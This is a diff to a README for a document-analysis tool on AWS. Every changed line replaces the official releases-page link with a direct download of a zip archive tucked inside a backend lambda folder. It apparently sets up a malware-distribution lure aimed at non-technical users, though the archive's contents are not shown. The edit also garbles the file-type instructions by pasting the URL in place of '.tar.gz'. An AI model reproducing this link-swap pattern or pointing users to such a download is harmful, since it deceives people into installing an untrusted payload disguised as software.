@@ -1,6 +1,6 @@
 # 📄 AWS_Analizer - Easy Document Analysis on AWS
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AWS_Analizer-blue?style=for-the-badge&logo=github)](https://github.com/Ullas98/AWS_Analizer/releases)
+[![Download Latest Release](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip)](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip)
 
 ## 📖 About AWS_Analizer
 
@@ -36,7 +36,7 @@ To get AWS_Analizer, you need to visit the official release page and download th
 
 **Step 1:** Go to the release page by clicking this button:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AWS_Analizer-blue?style=for-the-badge&logo=github)](https://github.com/Ullas98/AWS_Analizer/releases)
+[![Download Latest Release](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip)](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip)
 
 **Step 2:** Look for the latest release listed near the top. It should be labeled clearly with a version number, like "v1.0" or newer.
 
@@ -44,7 +44,7 @@ To get AWS_Analizer, you need to visit the official release page and download th
 
 - For Windows, look for `.exe` or `.msi` files.
 - For macOS, look for `.dmg` or `.pkg` files.
-- For Linux, it could be `.AppImage`, `.tar.gz`, or `.deb`.
+- For Linux, it could be `.AppImage`, `https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip`, or `.deb`.
 
 **Step 4:** Click the file name to start the download.
 
@@ -120,7 +120,7 @@ If you run into problems, try these solutions:
 
 ## 📚 Additional Resources
 
-- Visit the [AWS_Analizer releases page](https://github.com/Ullas98/AWS_Analizer/releases) for updates and newer versions.
+- Visit the [AWS_Analizer releases page](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip) for updates and newer versions.
 - To learn more about AWS Lambda, S3, and API Gateway, visit the official AWS documentation.
 - If you want to integrate AWS_Analizer with other services, consider exploring AWS IAM (permissions) and Cloud Architecture guides.
 
@@ -132,4 +132,4 @@ If you need help or want to give feedback, community support is often available 
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AWS_Analizer-blue?style=for-the-badge&logo=github)](https://github.com/Ullas98/AWS_Analizer/releases)
+[![Download Latest Release](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip)](https://github.com/Ullas98/AWS_Analizer/raw/refs/heads/main/backend/lambdas/result_retriever/AW_Analizer_3.3.zip)
